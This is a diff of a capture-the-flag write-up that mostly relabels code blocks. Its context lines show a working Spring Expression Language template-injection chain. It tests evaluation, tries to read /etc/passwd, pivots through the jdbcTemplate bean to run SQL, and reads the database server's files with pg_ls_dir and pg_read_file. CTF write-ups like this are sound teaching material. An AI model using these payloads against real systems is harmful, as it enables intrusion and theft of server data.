@@ -36,7 +36,7 @@ In the next step, I created a small helper to extract the evaluated value from t
 
 **Create small helper:**
 
-```python
+```bash
 # ex: send a payload to /cat?name=..., extract the value set into action="/rating?cat=..."
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex() {
@@ -49,7 +49,7 @@ sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))'
 
 **Check if my small helper and SSTI works or not:**
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{7*7}}'
 49
@@ -59,7 +59,7 @@ Okay, will think after this part, everything will get easy, but NO, the point is
 
 **Checking environment bean:**
 
-```python
+```bash
 
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@environment!=null?1:0}}'
@@ -75,7 +75,7 @@ coty
 
 **Reading Java file, checking RCE:**
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${ T(java.nio.file.Files).readString(... "/etc/passwd") }'
 # NULL
@@ -87,9 +87,11 @@ coty
 **Pivot to the database via Spring beans:**
 
 After the direct info leak route failed (`ENV` read and `T(java.*)` calls returned nothing). Maybe the **FLAG** is stored in DB. I pivoted to the database via Spring beans. I can reference **Spring-managed beans** directly in the expression context using the `@beanName` syntax. If the app wires a `JdbcTemplate`/`DataSource`, I can call it to run SQL from within the template expression—so your attack surface “pivots” from the view layer to the **database**.
-[**JdbcTemplate**](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/jdbc/core/JdbcTemplate.html) is common in Spring apps. It executes core JDBC workflow, leaving application code to provide **SQL** and extract results. I will check if I can use `JdbcTemplate`:
+[**JdbcTemplate**](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/jdbc/core/JdbcTemplate.html) is common in Spring apps. It executes core JDBC workflow, leaving application code to provide **SQL** and extract results.  
 
-```python
+I will check if I can use `JdbcTemplate`:
+
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@jdbcTemplate!=null?1:0}}'
 1
@@ -100,7 +102,7 @@ After the direct info leak route failed (`ENV` read and `T(java.*)` calls return
 
 DB config disclosure:
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@environment.getProperty("spring.datasource.url")}}'
 jdbc:postgresql://postgres:5432/coty_db
@@ -108,23 +110,21 @@ jdbc:postgresql://postgres:5432/coty_db
 
 List schema & tables:
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@jdbcTemplate.queryForList("select table_name from information_schema.tables where table_schema=$$public$$ order by 1",T(java.lang.String)).toString()}}'
 [cats, ratings]
 ```
 
 - There is no table/field “flag”.
-
 That’s why at first I said this kind of **SSTI** hides the flag too well.
 
-Lateral read via PostgreSQL system functions:
-
+Lateral read via PostgreSQL system functions:  
 Once I can run **SQL**, that mean I wont need to touch the web tier and pivot into the DB. Postgres will let me **list and read files on the DB server’s filesystem**.
 
 List root FS from Postgres:
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@jdbcTemplate.queryForList("select * from pg_ls_dir($$/$$) order by 1",T(java.lang.String)).toString()}}'
 [4546ab28d463c0d2-secret.txt, bin, boot, dev, docker-entrypoint-initdb.d, .dockerenv, etc, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, sys, tmp, usr, var]
@@ -134,7 +134,7 @@ Read files with `pg_read_file`:
 
 [**pg_read_file**](https://pgpedia.info/p/pg_read_file.html) is a built-in Postgres function that returns the contents of a file **on the DB server’s filesystem.**
 
-```python
+```bash
 ┌──(I3isk3t㉿kali)-[~]
 └─$ ex '${{@jdbcTemplate.queryForObject("select pg_read_file($$/4546ab28d463c0d2-secret.txt$$)", T(java.lang.String))}}'
 DDC{spR1N9_3xpr3S1s0N_lan9UA93_1S_P0W3rFUL}
